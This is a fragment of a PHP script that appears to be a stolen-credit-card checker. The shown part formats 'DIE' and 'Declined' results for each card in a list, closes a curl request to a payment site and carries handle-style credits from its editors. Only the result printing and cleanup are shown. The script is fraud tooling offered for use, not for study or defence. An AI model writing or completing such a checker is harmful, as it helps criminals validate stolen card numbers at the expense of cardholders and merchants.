  echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
else {
    echo '<span class="badge badge-danger">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger">Declined✘ ʏᴏᴜʀ ᴄᴀʀᴅ ᴡᴀs ᴅᴇᴄʟɪɴᴇᴅ</span> </span> <span class="badge badge-primary">★𝓜𝓘𝓛𝓔𝓢★</span> </br>';
}
  curl_close($curl);
  ob_flush();
  echo $result;
  //////=========Comment echo $result If U Want To Hide Site Side Response
/////////////////////=====Edited By @MrNiceguy25                  =======================Credits to Chillz====================\\\\\\\\\\\\\\\

?>
